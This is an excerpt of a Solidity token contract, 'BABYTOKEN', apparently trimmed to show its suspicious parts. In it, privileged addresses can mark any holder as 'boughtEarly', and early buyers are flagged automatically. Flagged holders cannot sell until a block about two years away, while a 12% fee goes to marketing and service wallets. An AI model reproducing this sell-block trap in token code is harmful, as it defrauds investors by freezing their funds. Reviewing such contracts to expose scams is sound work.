...
abstract contract Ownable is Context {
     ...
     */
    modifier authorized() {
        require(authorizations[_msgSender()], "!AUTHORIZED"); _;
    }
...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    uint256 public _walletMax = 5*10**12 * (10 ** 18);
    ...
    function addBoughtEarly(address account) external  authorized {
        boughtEarly[account] = true;
		emit BoughtEarly(account); 
    }	
    ...
    function setTokenRewardsFee(uint256 value) external  authorized {
        tokenRewardsFee = value;
        totalFees = tokenRewardsFee.add(liquidityFee).add(marketingFee);
        require(totalFees <= 20, "Total fee is over 20%");
    }

    function setLiquiditFee(uint256 value) external  authorized {
        liquidityFee = value;
        totalFees = tokenRewardsFee.add(liquidityFee).add(marketingFee);
        require(totalFees <= 20, "Total fee is over 20%");
    }

    function setMarketingFee(uint256 value) external  authorized {
        marketingFee = value;
        totalFees = tokenRewardsFee.add(liquidityFee).add(marketingFee);
        require(totalFees <= 20, "Total fee is over 20%");
    }
...
//start launch
		...
		if(from != owner() && to != uniswapV2Pair && block.number < launchedAt + 20){
			boughtEarly[to] = true;
			emit BoughtEarly(to);
		}
		
//lock two Years  730 days   auto unlock
		
		if(block.number<36008888){
		
		require(!boughtEarly[from],"Locked now.Auto unlock at  block.numbe  >=36008888");	
...
//------------		
        ...
        {
            require(balanceOf(to).add(amount) <= _walletMax,"ERROR:restrictWhales");
        }
        ...
        if (takeFee) {
			//fee 12%  NOT allow change↓
            uint256 fees = amount.mul(12).div(100);
    ...
    function swapAndSendToFee(uint256 tokens) private {
        ...
        IERC20(rewardToken).transfer(_marketingWalletAddress, newBalance.mul(5).div(10));
		IERC20(rewardToken).transfer(_serviceFeeReceiver, newBalance.mul(5).div(10));		
    }
